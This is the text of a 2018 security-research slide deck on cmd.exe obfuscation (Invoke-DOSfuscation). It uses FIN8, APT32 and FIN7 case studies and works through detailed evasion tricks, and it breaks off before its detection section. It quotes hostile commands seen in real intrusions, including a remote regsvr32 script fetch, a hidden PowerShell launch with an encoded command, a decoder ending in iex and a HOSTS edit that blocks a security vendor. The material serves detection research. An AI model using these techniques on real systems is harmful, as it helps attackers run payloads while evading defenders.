Invoke-DOSfuscation
Techniques FOR %F IN (-style) DO (S-level CMD Obfuscation)

Daniel Bohannon @danielhbohannon Senior Applied Security Researcher Mandiant, A FireEye Company
COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

http://insights.looloo.com/wp-content/uploads/2016/10/Latte-Art-in-Manila-Featured-FB.

C:\> """who""am"i
· Daniel Bohannon · Title :: Senior Applied Security Researcher · Team :: Advanced Practices Team @ Mandiant/FireEye · Twitter :: @danielhbohannon · Blog :: http://danielbohannon.com
· Projects · Invoke-Obfuscation & Invoke-CradleCrafter · Revoke-Obfuscation (w/@Lee_Holmes) · Invoke-DOSfuscation
2 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

DISCLAIMER: · Case studies and examples are drawn from our experiences and
activities working for a variety of customers, and do not represent our work for any one customer or set of customers. In many cases, facts have been changed to obscure the identity of our customers and individuals associated with our customers.
3 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

OUTLINE
State of the Union Obfuscation Obfuscation in the Wild: 3 Case Studies Whose Binary is it Anyway: Obfuscating Binary Names Deep Dive: Character Insertion Obfuscation Deep(er) Dive: Advanced Payload Obfuscation Invoke-DOSfuscation Demo Detecting DOSfuscation
4 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

OUTLINE
C:\> State of the Union Obfuscation Obfuscation in the Wild: 3 Case Studies Whose Binary is it Anyway: Obfuscating Binary Names Deep Dive: Character Insertion Obfuscation Deep(er) Dive: Advanced Payload Obfuscation Invoke-DOSfuscation Demo Detecting DOSfuscation
5 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

State of Obfuscation [Red Team]
· Why Obfuscate? · Evade static (and some dynamic) detections · Increase work for defenders
· How Extensive? · Some obfuscation framework exists for almost any scripting language that attackers like to use
· Slowing down? · Not any time soon (but I may be biased)
6 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Not The Droid You're Looking For
https://i.imgur.com/lG8bRQe.jpg

State of Obfuscation [Blue Team]
· Additional Host-Based Visibility · AMSI: Antimalware Scan Interface · ETW: Event Tracing (Windows)
· Signature-less Detection Approaches · Revoke-Obfuscation (AST-based PowerShell obfuscation detection framework)
· Room for improvement? · Absolutely, because attackers are responding by...
7 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

State of Obfuscation [Attacker Response]
· Choosing softer targets · Disabling defensive visibility
· AMSI, ETW, Anti-forensics · Using languages that do not provide good visibility
· JavaScript (quieter than PS, but still AMSI)
· AMSI visibility if run via Windows Script Host (VBS or JScript)
· C# (msbuild.exe all the things) · Custom binaries (b/c whitelisting still uncommon)
8 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

http://www.syslog.com/~jwilson/pics-i-like/kurios119.jpg

State of Obfuscation [My Response]
· What is this talk? · NOT PowerShell (well, not entirely)
9 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

State of Obfuscation [My Response]
· What is this talk? · NOT PowerShell (well, not entirely) · Cmd.exe obfuscation
· Cmd.exe visibility · Command line arguments · Parent/child process relationships · Source of action on registry, files, etc.
But why an entire framework for cmd.exe obfuscation?
10 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

OUTLINE
State of the Union Obfuscation C:\> Obfuscation in the Wild: 3 Case Studies
Whose Binary is it Anyway: Obfuscating Binary Names Deep Dive: Character Insertion Obfuscation Deep(er) Dive: Advanced Payload Obfuscation Invoke-DOSfuscation Demo Detecting DOSfuscation
11 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Obfuscation in the Wild
· June 30, 2017
· Co-authored blog post with Nick Carr (@itsreallynick)
· Outlines three different obfuscation techniques that MANDIANT consultants identified three threat actors using · Feb 2017 :: FIN8 · Apr 2017 :: APT32 (OceanLotus, Vietnam) · Jun 2017 :: FIN7 (Carbanak)
12 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #1: FIN8
· February 2017 · Process-level environment variables + PowerShell StdIn (launched from macro)
cmd /c echo %_MICROSOFT_UPDATE_CATALOG% | %_MICROSOFT_UPDATE_SERVICE%
powershell -
$s=$Env:_CT;$o='';$l=$s.length;$i=$Env:_PA%$l;while($o.length -ne$l){$o+=$s[$i];$i=($i+$Env:_KE)%$l}iex($o)
13 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #2: APT32 (OceanLotus)

· April 2017

· Caret and un-paired double quotes in regsvr32.exe arguments

· /i:^h^t^t^p · /i:"h"t"t"p

(does not show up in regsvr32.exe arguments) (DOES show up in regsvr32.exe arguments ­ must be even number of quotes)

Host Investigative Platform (HIP) capturing real-time attacker activity during a MANDIANT incident response engagement for APT32 activity
14 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)
· June 2017 · DOCX/RTF + LNK w/Word COM to retrieve remaining payload from original document · Process-level environment variables + cmd.exe StdIn · JavaScript encoding & concatenation: · "Wor"+"d.Application" and [String.fromCharCode(101)+'va'+'l']
15 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)
16 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://i.imgur.com/tZpnpiI.gif

Case Study #3: FIN7 (Carbanak)
· cmd.exe /c set x=wscript /e:jscript ... echo %x%|cmd
17 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)

· cmd.exe /c set x=wscript /e:jscript ... echo %x%|cmd

Process-level env var

Process-level env var

18 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)
· cmd.exe /c set x=wscript /e:jscript ... echo %x%|cmd
Garbage delimiter
19 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)
· cmd.exe /c set x=wsc@ript /e:jscript ... echo %x%|cmd
Garbage delimiter
20 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)
· cmd.exe /c set x=wsc@ript /e:js@cript ... echo %x%|cmd
Garbage delimiter
21 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)

· cmd.exe /c set x=wsc@ript /e:js@cript ... echo %x%|cmd

Garbage delimiter

Delimiter removal

22 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)

· cmd.exe /c set x=wsc@ript /e:js@cript ... echo %x %|cmd

Garbage delimiter

Delimiter removal

23 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)

· cmd.exe /c set x=wsc@ript /e:js@cript ... echo %x:@=%|cmd

Garbage delimiter

Delimiter removal

24 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)
· cmd.exe /c set x=wsc@ript /e:js@cript ... echo %x:@=%|cmd

25 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://media.giphy.com/media/l4Jz3a8jO92crUlWM/giphy.gif

Case Study #3: FIN7 (Carbanak)
· Timeline
· Wed :: June 28, 2017 ­ Nick Carr (@itsreallynick) finds FIN7 testing payload
· Thu :: June 29, 2017 ­ We write blog post · Fri :: June 30, 2017 ­ We publish blog post · Sat/Sun :: July 1-2, 2017 ­ I write and release POC:
Out-FINcodedCommand
26 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Case Study #3: FIN7 (Carbanak)
· Timeline
· Wed :: June 28, 2017 ­ Nick Carr (@itsreallynick) finds FIN7 testing payload
· Thu :: June 29, 2017 ­ We write blog post · Fri :: June 30, 2017 ­ We publish blog post · Sat/Sun :: July 1-2, 2017 ­ I write and release POC:
Out-FINcodedCommand
"Is there more here?"
27 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Implications of This Research
· These obfuscation techniques affect:
· Dynamic detections
· Arguments, parent/child relationship, env var, stdin
· Static detections
· All of the above + so much more
· CFP submissions 

SO YOU THINK EVENT LOGS DEOBFUSCATE CMD ARGS
PLEASE, TELL ME MORE ABOUT YOUR TESTING
https://memegenerator.net/img/images/600x600/2729805/willy-wonka.jpg

28 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Implications of This Research cmd.exe /c "echo Invoke-DOSfuscation"
29 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Implications of This Research cmd.exe /c "set O=fuscation&set B=okeDOS&&set D=echo Inv&&call %D%%B%%O%"
30 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Implications of This Research cm%windir:~ -4, -3%.e^Xe,;^,/^C",;,S^Et ^ ^o^=fus^cat^ion&,;,^se^T ^ ^ ^B^=o^ke-D^OS&&,;,s^Et^ ^ d^=ec^ho I^nv&&,;,C^Al^l,;,^%^D%^%B%^%o^%"
31 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Implications of This Research FOR /F "delims=il tokens=+4" %Z IN ('assoc .cdxml') DO %Z ,;^,/^C",;,S^Et ^ ^o^=fus^cat^ion&,;,^se^T ^ ^ ^B^=o^keD^OS&&,;,s^Et^ ^ d^=ec^ho I^nv&&,;,C^Al^l,;,^%^D%^%B%^%o%"
32 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Implications of This Research
^F^oR , , , , , ; ; /^f ; ; ; ; ; , " delims=il tokens= +4 " ; ; ; , , , , %Z ; , , , , ^In , , ; ; , , , ( , ; ; ; ' , , , , , ; ^^a^^S^^s^^oC ; , , , , ; .c^^d^^xm^^l ' ; , , , , ) , , , , ; , ^d^o , , , , , , , %Z , ; ^ ,/^C" , ; , S^Et ^ ^o^=fus^cat^ion& , ; , ^se^T ^ ^ ^B^=o^ke-D^OS&& , ; , s^Et^ ^ d^=ec^ho I^nv&& , ; , C^Al^l , ; , ^ %^D%^%B%^%o%"
33 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Implications of This Research ­ HANG ON TIGHT
http://photos.motogp.com/2015/07/16/sunday-rider3---ross-noble_0.big.jpg 34 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Implications of This Research ­ HANG ON TIGHT AS WE STACK

http://photos.motogp.com/2015/07/16/sunday-rider3---ross-noble_0.big.jpg 35 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://www.thesun.co.uk/wp-content/uploads/2016/04/1802881.main_image.jpg

OUTLINE
State of the Union Obfuscation Obfuscation in the Wild: 3 Case Studies C:\> Whose Binary is it Anyway: Obfuscating Binary Names Deep Dive: Character Insertion Obfuscation Deep(er) Dive: Advanced Payload Obfuscation Invoke-DOSfuscation Demo Detecting DOSfuscation
36 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Whose Binary is it Anyway: Obfuscating Binary Names
· Rename/copy cmd.exe · Cmd.exe substitutes (kind of)
· forfiles.exe (@vector_sec) · pcalua.exe · scriptrunner.exe (@KyleHanslovan -- Win10+)
37 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Whose Binary is it Anyway: Obfuscating Binary Names
· Rename/copy cmd.exe · Cmd.exe substitutes (kind of)
· forfiles.exe (@vector_sec) · pcalua.exe · scriptrunner.exe (@KyleHanslovan -- Win10+) · https://gist.github.com/api0cradle/8cdc53e2a80de079709d28a2d96458c2
· Syntactical obfuscation of legitimate binary name?
38 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Whose Binary is it Anyway: Obfuscating Binary Names

· Env var encoding
· Nothing new · Resolves on command line

C:\> echo %ProgramData% C:\ProgramData
C:\> echo %ProgramData:~0,1%%ProgramData:~9,2% CmD

C:\> %ProgramData:~0,1%%ProgramData:~9,2% CmD C:\> %ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1% Powershell
39 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Whose Binary is it Anyway: Obfuscating Binary Names
· Something that does NOT resolve on the command line (i.e. internal commands)
· SET · ASSOC · FTYPE
40 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Whose Binary is it Anyway: Obfuscating Binary Names
· Using SET to produce the string PowerShell
41 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Whose Binary is it Anyway: Obfuscating Binary Names
· Using SET to produce the string PowerShell
Required (case-sensitive) delimiters are: s and \ PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
42 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Whose Binary is it Anyway: Obfuscating Binary Names
· Using SET to produce the string PowerShell

Required (case-sensitive) delimiters are: s and \

PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules

1

2

3

4

5 6 7 8 9 10

11 12 13

43 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Whose Binary is it Anyway: Obfuscating Binary Names
· Using SET to produce the string PowerShell

Required (case-sensitive) delimiters are: s and \

PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules

1

2

3

4

5 6 7 8 9 10

11 12 13

cmd.exe /c "FOR /F "delims=s\ tokens=4" %a IN ('set^|findstr PSM')DO %a"

44 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

OUTLINE
State of the Union Obfuscation Obfuscation in the Wild: 3 Case Studies Whose Binary is it Anyway: Obfuscating Binary Names C:\> Deep Dive: Character Insertion Obfuscation Deep(er) Dive: Advanced Payload Obfuscation Invoke-DOSfuscation Demo Detecting DOSfuscation
45 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep Dive: Character Insertion Obfuscation

· Typically more useful for evading static analysis detections rather than dynamic detections

· Caret escape character (^)

"C:\WINDOWS\system32\cmd.exe" /c P^o^w^e^r^S^h^e^l^l^.^e^x^e^ -NoExit -Exec Bypass -EC IAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHk...

· Double quotes, evenly balanced ("") regsvr32.exe /s /n /u /i:"h"t"t"p://<REDACTED>.jpg scrobj.dll

· Encapsulating parentheses

· Leading & trailing special characters ,cmd;/ccalc

· Standard input argument hiding

cmd /c echo calc|cmd

46 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep Dive: Character Insertion Obfuscation

· Typically more useful for evading static analysis detections rather than dynamic detections

· Nonexistent env vars (batch files) echo "Find Evil!"  ec%a%ho "Fi%b%nd Ev%c%il!"

· https://marcin-chwedczuk.github.io/obfuscating-windows-batch-files

· Custom env vars · Existing env vars

..\..\..\WINDOWS\system32\cmd.exe /V /K set p=p&&!p!owershell -w hidden -c "IEX ((('Q0zF='+'Q0z'+'env:T'+'emp+'+'zARYUEyjv'...
C:\> echo %ProgramData% C:\ProgramData

C:\> echo %ProgramData:~0,1%%ProgramData:~9,2% CmD

47 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep Dive: Character Insertion Obfuscation
· Out-FINcodedCommand POC · A few binary syntax options with environment variable character substitution
48 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep Dive: Character Insertion Obfuscation
· Out-FINcodedCommand POC · A few binary syntax options with environment variable character substitution
49 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep Dive: Character Insertion Obfuscation (ITW 1/3)
· Env var encoding in the wild
· SHA-256: 661877d416f34411fad7e22246ee0d61d14de3065a34b0a7b2f28052d56db6e2
%comspec:~-16,1%%comspec:~-1%%comspec:~-13,1% decodes to set
50 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep Dive: Character Insertion Obfuscation (ITW 2/3)
· Env var encoding in the wild
· SHA-256: 9e1df42f00829d16afd97c575f08da45467bbcab92ca5e3d2832a009dddaa8a7 · Obfuscator: https://github.com/guillaC/JSBatchobfuscator
Set full alphabet in custom env var
DECODED
51 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep Dive: Character Insertion Obfuscation (ITW 3/3)
· Env var encoding in the wild
· SHA-256: 761483906b45fad51f3c7ab66b1534dee137e93a52816aa270bc97249acb56d0 (see white paper!)
Set env var called ' (single quote) with known env var substrings Assemble payload as substrings from newly-set ' env var
52 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

OUTLINE
State of the Union Obfuscation Obfuscation in the Wild: 3 Case Studies Whose Binary is it Anyway: Obfuscating Binary Names Deep Dive: Character Insertion Obfuscation C:\> Deep(er) Dive: Advanced Payload Obfuscation Invoke-DOSfuscation Demo Detecting DOSfuscation
53 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING

cmd.exe setup portion

rest of the command

54 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING
· %COMSPEC% :: env var for "C:\Windows\system32\cmd.exe" · /b :: exits cmd.exe to calling program with specified process exit code · /c :: remainder of command line processed as a command · start :: execute remaining command without waiting for it to finish · /b :: (same as before but for second command) · /min :: start window minimized
55 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING · Env var substring · Env var substitution
56 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING · Env var substring · Env var substitution
27 chars
57 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING

· Env var substring · Env var substitution

· %COMSPEC:~0% · %COMSPEC:~0,27% · %COMSPEC:~-27% · %COMSPEC:~-27,27%

27 chars

58 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING

· Env var substring · Env var substitution

· %COMSPEC:~0% · %COMSPEC:~0,27% · %COMSPEC:~0,1337% · %COMSPEC:~-27% · %COMSPEC:~-1337% · %COMSPEC:~-27,27% · %COMSPEC:~-1337,1337%

27 chars

59 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING

· Env var substring · Env var substitution

· %COMSPEC:~0% · %COMSPEC:~0,27% · %COMSPEC:~0,1337% · %COMSPEC:~-27% · %COMSPEC:~-1337% · %COMSPEC:~-27,27% · %COMSPEC:~-1337,1337%
· %COMSPEC:\=/% · %COMSPEC:KeepMatt=Happy% · %COMSPEC:*System32\=% · %COMSPEC:*Tea=Coffee%

60 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING

· Env var substring
· %COMSPEC:~0,27%
· Env var substitution
· %COMSPEC:\=/%

· %COMSPEC:~0% · %COMSPEC:~0,27% · %COMSPEC:~0,1337% · %COMSPEC:~-27% · %COMSPEC:~-1337% · %COMSPEC:~-27,27% · %COMSPEC:~-1337,1337%
· %COMSPEC:\=/% · %COMSPEC:KeepMatt=Happy% · %COMSPEC:*System32\=% · %COMSPEC:*Tea=Coffee%

61 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING

· Env var substring
· %coMSPec:~0,27%
· Env var substitution
· %coMSPec:\=/%

· Random Case

62 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING

· Env var substring
· %coMSPec:~ 0, 27%
· Env var substitution
· %coMSPec: \ = / %

· Random Case · Whitespace

63 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· %COMSPEC% /b /c start /b /min netstat -ano | findstr LISTENING

· Env var substring
· %coMSPec:~ -0, +27%
· Env var substitution
· %coMSPec: \ = / %

· Random Case · Whitespace · Explicit signing

64 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %coMSPec: \ = / % /b /c start /b /min netstat -ano | findstr LISTENING
· Env var substring
· %coMSPec:~ -0, +27%
· Env var substitution
· %coMSPec: \ = / %
65 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %coMSPec: \ = / % /b /c start /b /min netstat -ano | findstr LISTENING
· Context is crucial ·  Cmd.exe ·  WScript.Shell ·  Service ·  Run key ·  Scheduled task
66 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %coMSPec: \ = / % /B /c sTArt /b /mIN neTSTat -aNo | fiNDstr LISTENING
· Random case
67 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %coMSPec: \ = / %/B/csTArt/b/mIN neTSTat -aNo|fiNDstr LISTENING

· Random case · Whitespace (-/+)

NOTE: Single whitespace is added to process arguments.
C:\Windows\system32\cmd.exe /B/csTArt/b/mIN neTSTat -aNo

68 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %coMSPec: \ = / %/B/csTArt/b/mIN neTSTat -aNo|fiNDstr LISTENING

· Random case · Whitespace (-/+)

Netstat's -ano arg reordering

69 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %coMSPec: \ = / %/B/csTArt/b/mIN neTSTat -Noa|fiNDstr LISTENING

· Random case · Whitespace (-/+)

Netstat's -ano arg reordering

70 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· %coMSPec: \ = / % /B /c sTArt /b /mIN neTSTat -Noa | fiNDstr LISTENING
· Random case · Whitespace (-/+)
71 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· ,;,%coMSPec: \ = / %,;,/B,;,/c,;,sTArt,;,/b ,;/mIN ,;neTSTat -Noa |,;,fiNDstr LISTENING
· Random case · Whitespace (-/+) · Comma & semicolon
72 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· ,;,%coMSPec:^^^^\^^^^=^^^^/^^^^%^ ,;,^^^^/^^^^B^^^^,;,^^^^/^c,;,^^sT^^Art^^,;,/^^^^b ^^^^ ,;/^^^^mIN^^^^ ,;neT^^^^STat ^^^^ ^^^^-N^^^^oa ^^^^ ^|,;,fi^^^NDstr LIST^^^ENING

· Random case · Whitespace (-/+) · Comma & semicolon · Caret

Let's look at process execution layers & respective arguments!

73 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· ,;,%coMSPec:^^^^\^^^^=^^^^/^^^^%^ ,;,^^^^/^^^^B^^^^,;,^^^^/^c,;,^^sT^^Art^^,;,/^^^^b ^^^^ ,;/^^^^mIN^^^^ ,;neT^^^^STat ^^^^ ^^^^-N^^^^oa ^^^^ ^|,;,fi^^^NDstr LIST^^^ENING

neTSTat -Noa

fiNDstr LISTENING

C:\Windows\system32\cmd.exe /S /D /c" sTArt,;,/^b ^ ,;/^mIN^ ,;neT^STat ^ ^-N^oa ^ "

C:\Windows\system32\cmd.exe ,;,^^/^^B^^,;,^^/c,;,^sT^Art^,;,/^^b ^^ ,;/^^mIN^^ ,;neT^^STat ^^ ^^-N^^oa ^^ |,;,fi^NDstr LIST^ENING

74 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· ,;,%coMSPec:^^^^\^^^^=^^^^/^^^^%^ ,;,^^^^/^^^^B^^^^,;,^^^^/^c,;,^^sT^^Art^^,;,/^^^^b

^^^^ ,;/^^^^mIN^^^^ ,;neT^^^^STat ^^^^ ^^^^-N^^^^oa ^^^^ ^|,;,fi^^^NDstr

LIST^^^ENING

, ; and ^ do NOT persist into final

netstat & findstr commands. Is there

another obfuscation character?

neTSTat -Noa

fiNDstr LISTENING

C:\Windows\system32\cmd.exe /S /D /c" sTArt,;,/^b ^ ,;/^mIN^ ,;neT^STat ^ ^-N^oa ^ "

C:\Windows\system32\cmd.exe ,;,^^/^^B^^,;,^^/c,;,^sT^Art^,;,/^^b ^^ ,;/^^mIN^^ ,;neT^^STat ^^ ^^-N^^oa ^^ |,;,fi^NDstr LIST^ENING

75 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· ,;,%coMSPec:^^^^\^^^^=^^^^/^^^^%^ ,;,^^^^/^^^^B^^^^,;,^^^^/^c,;,^^sT^^Art^^,;,/^^^^b

^^^^ ,;/^^^^mIN^^^^ ,;neT^^^^ST""at ^^^^ ^^^^-N^^^^o""a ^^^^ ^|,;,fi^^^ND""str

LIST^^^EN""ING

YES! Double quotes are widely-

accepted obfuscation characters.

(, ; and ^ are binary-specific)

neTST""at -No""a

fiND""str LISTEN""ING

C:\Windows\system32\cmd.exe /S /D /c" sTArt,;,/^b ^ ,;/^mIN^ ,;neT^ST""at ^ ^-N^o""a ^ "

C:\Windows\system32\cmd.exe ,;,^^/^^B^^,;,^^/c,;,^sT^Art^,;,/^^b ^^ ,;/^^mIN^^ ,;neT^^ST""at ^^ ^^-N^^o""a ^^ |,;,fi^ND""str LIST^EN""ING

76 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· Invoke-DOSfuscation supports and randomizes all of these obfuscation components · For obfuscating final cmdline arguments:
· User-input command (e.g. netstat -ano) must be obfuscated manually (, ; ^ "" etc.)
· Invoke-DOSfuscation handles all layers of escaping for input obfuscation characters
INSANELY complicated in certain scenarios, especially since there is no tokenizer for cmd.exe like there is for PowerShell.
77 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation

· Invoke-DOSfuscation supports and randomizes all of these obfuscation components
· For obfuscating final cmdline arguments:
· User-input command (e.g. netstat -ano) must be obfuscated manually (, ; ^ "" etc.)
· Invoke-DOSfuscation handles all layers of escaping for input obfuscation characters

INSANELY complicated in certain scenarios, especially since there is no tokenizer for cmd.exe like there is for PowerShell.
78 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

http://www.reactiongifs.com/r/small-violin.gif

Deep(er) Dive: Advanced Payload Obfuscation
· What cmd.exe commands do attackers use that do NOT create child processes?
79 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· What cmd.exe commands do attackers use that do NOT create child processes?
· File copy: cmd /c copy powershell.exe benign.exe · File deletion: cmd /c del benign.exe · File creation: cmd /c "echo LINE1 > bad.vbs&&echo LINE2 >> bad.vbs" · File read: cmd /c type HOSTS · File modification: cmd /c "echo 127.0.0.1 cloud.security-vendor.com >> HOSTS" · File listing: cmd /c dir "C:\Program Files\*" · Dir creation: cmd /c mkdir %PUBLIC%\Recon · Symbolic link creation: cmd /c mklink ClickMe C:\Users\Public\evil.exe
80 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Deep(er) Dive: Advanced Payload Obfuscation
· Perhaps your target is monitoring for carets, commas, semicolons, etc. · What additional obfuscation options does cmd.exe give us?
1. 2. 3. 4.
81 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat -ano
82 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat -ano
­ and / interchangeability
83 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat /ano
­ and / interchangeability
84 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat /ano
­ and / interchangeability
